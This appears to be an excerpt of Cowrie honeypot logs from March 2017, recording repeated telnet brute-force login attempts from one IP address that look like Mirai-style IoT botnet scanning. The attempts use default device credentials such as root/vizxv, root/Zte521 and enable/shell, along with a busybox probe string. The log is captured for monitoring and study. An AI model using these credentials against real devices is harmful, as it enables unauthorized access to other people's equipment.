+2017-03-05T16:46:40+0000 [CowrieTelnetTransport,41693,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:40+0000 [CowrieTelnetTransport,41693,67.229.141.98] login attempt: 59389
+2017-03-05T16:46:40+0000 [CowrieTelnetTransport,41693,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:41+0000 [CowrieTelnetTransport,41693,67.229.141.98] login attempt [sh//bin/busybox ECCHI] failed
+2017-03-05T16:46:41+0000 [CowrieTelnetTransport,41693,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:41+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 67.229.141.98:48732 (10.8.41.81:2223) [session: TT41695]
+2017-03-05T16:46:41+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 67.229.141.98:34037 (10.8.41.81:2223) [session: TT41696]
+2017-03-05T16:46:41+0000 [CowrieTelnetTransport,41689,67.229.141.98] Connection lost after 41 seconds
+2017-03-05T16:46:41+0000 [CowrieTelnetTransport,41694,67.229.141.98] login attempt: 59390
+2017-03-05T16:46:41+0000 [CowrieTelnetTransport,41694,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:42+0000 [CowrieTelnetTransport,41694,67.229.141.98] login attempt [root/Zte521] failed
+2017-03-05T16:46:42+0000 [CowrieTelnetTransport,41694,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:43+0000 [CowrieTelnetTransport,41694,67.229.141.98] login attempt: 59391
+2017-03-05T16:46:43+0000 [CowrieTelnetTransport,41694,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:44+0000 [CowrieTelnetTransport,41694,67.229.141.98] login attempt [enable/shell] failed
+2017-03-05T16:46:44+0000 [CowrieTelnetTransport,41694,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:44+0000 [CowrieTelnetTransport,41694,67.229.141.98] login attempt: 59392
+2017-03-05T16:46:44+0000 [CowrieTelnetTransport,41694,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:45+0000 [CowrieTelnetTransport,41694,67.229.141.98] login attempt [sh//bin/busybox ECCHI] failed
+2017-03-05T16:46:45+0000 [CowrieTelnetTransport,41694,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:45+0000 [CowrieTelnetTransport,41690,67.229.141.98] Connection lost after 45 seconds
+2017-03-05T16:46:45+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 67.229.141.98:49905 (10.8.41.81:2223) [session: TT41697]
+2017-03-05T16:46:45+0000 [CowrieTelnetTransport,41697,67.229.141.98] Connection lost after 0 seconds
+2017-03-05T16:46:45+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 67.229.141.98:38630 (10.8.41.81:2223) [session: TT41698]
+2017-03-05T16:46:45+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 67.229.141.98:45566 (10.8.41.81:2223) [session: TT41699]
+2017-03-05T16:46:47+0000 [CowrieTelnetTransport,41695,67.229.141.98] login attempt: 59393
+2017-03-05T16:46:47+0000 [CowrieTelnetTransport,41695,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:48+0000 [CowrieTelnetTransport,41695,67.229.141.98] login attempt [root/] failed
+2017-03-05T16:46:48+0000 [CowrieTelnetTransport,41695,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:48+0000 [CowrieTelnetTransport,41696,67.229.141.98] login attempt: 59394
+2017-03-05T16:46:48+0000 [CowrieTelnetTransport,41696,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:49+0000 [CowrieTelnetTransport,41696,67.229.141.98] login attempt [root/vizxv] failed
+2017-03-05T16:46:49+0000 [CowrieTelnetTransport,41696,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:49+0000 [CowrieTelnetTransport,41691,67.229.141.98] Connection lost after 46 seconds
+2017-03-05T16:46:50+0000 [CowrieTelnetTransport,41695,67.229.141.98] login attempt: 59395
+2017-03-05T16:46:50+0000 [CowrieTelnetTransport,41695,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:51+0000 [CowrieTelnetTransport,41695,67.229.141.98] login attempt [enable/shell] failed
+2017-03-05T16:46:51+0000 [CowrieTelnetTransport,41695,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:51+0000 [CowrieTelnetTransport,41695,67.229.141.98] login attempt: 59396
+2017-03-05T16:46:51+0000 [CowrieTelnetTransport,41695,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:52+0000 [CowrieTelnetTransport,41695,67.229.141.98] login attempt [sh//bin/busybox ECCHI] failed
+2017-03-05T16:46:52+0000 [CowrieTelnetTransport,41695,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:52+0000 [CowrieTelnetTransport,41696,67.229.141.98] login attempt: 59397
+2017-03-05T16:46:52+0000 [CowrieTelnetTransport,41696,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:53+0000 [CowrieTelnetTransport,41696,67.229.141.98] login attempt [enable/shell] failed
+2017-03-05T16:46:53+0000 [CowrieTelnetTransport,41696,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:53+0000 [CowrieTelnetTransport,41698,67.229.141.98] login attempt: 59398
+2017-03-05T16:46:53+0000 [CowrieTelnetTransport,41698,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:54+0000 [CowrieTelnetTransport,41698,67.229.141.98] login attempt [root/888888] failed
+2017-03-05T16:46:54+0000 [CowrieTelnetTransport,41698,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:55+0000 [CowrieTelnetTransport,41699,67.229.141.98] login attempt: 59399
+2017-03-05T16:46:55+0000 [CowrieTelnetTransport,41699,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:56+0000 [CowrieTelnetTransport,41699,67.229.141.98] login attempt [root/password] failed
+2017-03-05T16:46:56+0000 [CowrieTelnetTransport,41699,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:56+0000 [HoneyPotSSHTransport,8897,116.31.116.51] connection lost
+2017-03-05T16:46:56+0000 [HoneyPotSSHTransport,8897,116.31.116.51] Connection lost after 52 seconds
+2017-03-05T16:46:56+0000 [CowrieTelnetTransport,41696,67.229.141.98] login attempt: 59400
+2017-03-05T16:46:56+0000 [CowrieTelnetTransport,41696,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:57+0000 [CowrieTelnetTransport,41696,67.229.141.98] login attempt [sh//bin/busybox ECCHI] failed
+2017-03-05T16:46:57+0000 [CowrieTelnetTransport,41696,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:57+0000 [CowrieTelnetTransport,41698,67.229.141.98] login attempt: 59401
+2017-03-05T16:46:57+0000 [CowrieTelnetTransport,41698,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:58+0000 [CowrieTelnetTransport,41698,67.229.141.98] login attempt [enable/shell] failed
+2017-03-05T16:46:58+0000 [CowrieTelnetTransport,41698,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:59+0000 [CowrieTelnetTransport,41699,67.229.141.98] login attempt: 59402
+2017-03-05T16:46:59+0000 [CowrieTelnetTransport,41699,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:47:00+0000 [CowrieTelnetTransport,41699,67.229.141.98] login attempt [enable/shell] failed
+2017-03-05T16:47:00+0000 [CowrieTelnetTransport,41699,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:47:00+0000 [CowrieTelnetTransport,41699,67.229.141.98] login attempt: 59403
+2017-03-05T16:47:00+0000 [CowrieTelnetTransport,41699,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:47:01+0000 [CowrieTelnetTransport,41699,67.229.141.98] login attempt [sh//bin/busybox ECCHI] failed
+2017-03-05T16:47:01+0000 [CowrieTelnetTransport,41699,67.229.141.98] Warning: state changed and new state returned
